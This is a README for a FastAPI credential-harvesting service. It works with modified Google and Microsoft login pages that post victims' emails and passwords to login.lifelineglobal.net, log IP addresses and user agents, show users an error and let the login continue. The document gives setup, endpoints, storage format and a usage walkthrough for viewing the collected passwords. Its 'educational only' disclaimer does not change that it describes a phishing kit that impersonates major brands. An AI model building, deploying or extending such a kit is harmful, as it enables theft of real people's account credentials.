# Login Collection API

A FastAPI application to collect login credentials from Google and Microsoft login pages.

## Features

- ✅ Collects email and password from login forms
- ✅ Logs client IP address and user agent
- ✅ Stores data in JSON files organized by date
- ✅ Web interface to view collected logs
- ✅ Automatic API documentation
- ✅ Health check endpoint

## Setup

1. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Run the API:**
   ```bash
   python login_api.py
   ```

3. **Access the API:**
   - Main page: http://localhost:8000
   - API docs: http://localhost:8000/docs
   - View logs: http://localhost:8000/logs
   - Health check: http://localhost:8000/health

## API Endpoints

### POST /login
Collects login credentials from the frontend forms.

**Parameters:**
- `email` (string): User's email address
- `password` (string): User's password

**Response:**
```json
{
  "status": "success",
  "message": "Login processed"
}
```

### GET /logs
Displays collected login data in a web interface.

### GET /health
Health check endpoint.

## Data Storage

Login data is stored in JSON files in the `logs/` directory:
- Format: `logs/logins_YYYY-MM-DD.json`
- Each entry includes:
  - Timestamp
  - Email address
  - Password
  - Client IP address
  - User agent string
  - Source identifier

## Integration with Login Pages

The API is designed to work with the modified Google and Microsoft login pages:

1. **Google Login** (`google.html`): Posts to `https://login.lifelineglobal.net/login`
2. **Microsoft Login** (`microsoft.html`): Posts to `https://login.lifelineglobal.net/login`

Both pages will:
- Collect email and password
- Post to the API endpoint
- Display error messages to users
- Continue with the login flow

## Security Notes

⚠️ **Important:** This API is for educational/demonstration purposes only. In production:

- Use HTTPS
- Implement proper authentication
- Add rate limiting
- Encrypt sensitive data
- Follow security best practices

## File Structure

```
├── login_api.py          # Main FastAPI application
├── requirements.txt      # Python dependencies
├── README_API.md        # This file
├── google.html          # Modified Google login page
├── microsoft.html       # Modified Microsoft login page
└── logs/                # Collected login data (created automatically)
    └── logins_2024-01-15.json
```

## Usage Example

1. Start the API server
2. Open `google.html` or `microsoft.html` in a browser
3. Enter email and password
4. Submit the form
5. Check `http://localhost:8000/logs` to view collected data

The API will automatically log all login attempts with full details. 